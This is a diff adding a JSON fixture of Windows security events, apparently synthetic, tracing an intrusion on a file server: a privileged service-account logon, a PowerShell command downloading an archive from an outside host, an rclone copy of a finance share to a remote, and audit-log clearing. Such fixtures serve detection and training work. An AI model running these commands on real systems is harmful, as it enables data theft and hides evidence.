@@ -1,0 +1,81 @@
+[
+  {
+    "TimeGenerated": "2026-11-10T13:30:00.000Z",
+    "Type": "SecurityEvent",
+    "Computer": "SRV-FILE-01.acme.local",
+    "EventID": 4624,
+    "Activity": "4624 - An account was successfully logged on.",
+    "Account": "ACME\\DC01$",
+    "TargetUserName": "DC01$",
+    "LogonType": 3,
+    "IpAddress": "10.10.0.10",
+    "WorkstationName": "DC01"
+  },
+  {
+    "TimeGenerated": "2026-11-10T13:40:12.000Z",
+    "Type": "SecurityEvent",
+    "Computer": "SRV-FILE-01.acme.local",
+    "EventID": 4624,
+    "Activity": "4624 - An account was successfully logged on.",
+    "Account": "ACME\\svc_backup",
+    "TargetUserName": "svc_backup",
+    "LogonType": 10,
+    "IpAddress": "10.10.20.23",
+    "WorkstationName": "WS-FIN-023"
+  },
+  {
+    "TimeGenerated": "2026-11-10T13:40:12.500Z",
+    "Type": "SecurityEvent",
+    "Computer": "SRV-FILE-01.acme.local",
+    "EventID": 4672,
+    "Activity": "4672 - Special privileges assigned to new logon.",
+    "Account": "ACME\\svc_backup",
+    "SubjectUserName": "svc_backup",
+    "PrivilegeList": "SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege"
+  },
+  {
+    "TimeGenerated": "2026-11-10T13:41:30.000Z",
+    "Type": "SecurityEvent",
+    "Computer": "SRV-FILE-01.acme.local",
+    "EventID": 4688,
+    "Activity": "4688 - A new process has been created.",
+    "Account": "ACME\\svc_backup",
+    "SubjectUserName": "svc_backup",
+    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "ParentProcessName": "C:\\Windows\\explorer.exe",
+    "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\""
+  },
+  {
+    "TimeGenerated": "2026-11-10T13:52:10.000Z",
+    "Type": "SecurityEvent",
+    "Computer": "SRV-FILE-01.acme.local",
+    "EventID": 4688,
+    "Activity": "4688 - A new process has been created.",
+    "Account": "ACME\\svc_backup",
+    "SubjectUserName": "svc_backup",
+    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "powershell -c \"iwr https://cdn-update.example-cdn.net/r.zip -o C:\\ProgramData\\rc\\r.zip; Expand-Archive C:\\ProgramData\\rc\\r.zip C:\\ProgramData\\rc\""
+  },
+  {
+    "TimeGenerated": "2026-11-10T13:57:40.000Z",
+    "Type": "SecurityEvent",
+    "Computer": "SRV-FILE-01.acme.local",
+    "EventID": 4688,
+    "Activity": "4688 - A new process has been created.",
+    "Account": "ACME\\svc_backup",
+    "SubjectUserName": "svc_backup",
+    "NewProcessName": "C:\\ProgramData\\rc\\rclone.exe",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "C:\\ProgramData\\rc\\rclone.exe copy D:\\Financeiro remote:bkp --transfers 8 --config C:\\ProgramData\\rc\\rclone.conf"
+  },
+  {
+    "TimeGenerated": "2026-11-10T14:31:05.000Z",
+    "Type": "SecurityEvent",
+    "Computer": "SRV-FILE-01.acme.local",
+    "EventID": 1102,
+    "Activity": "1102 - The audit log was cleared.",
+    "Account": "ACME\\svc_backup",
+    "SubjectUserName": "svc_backup"
+  }
+]
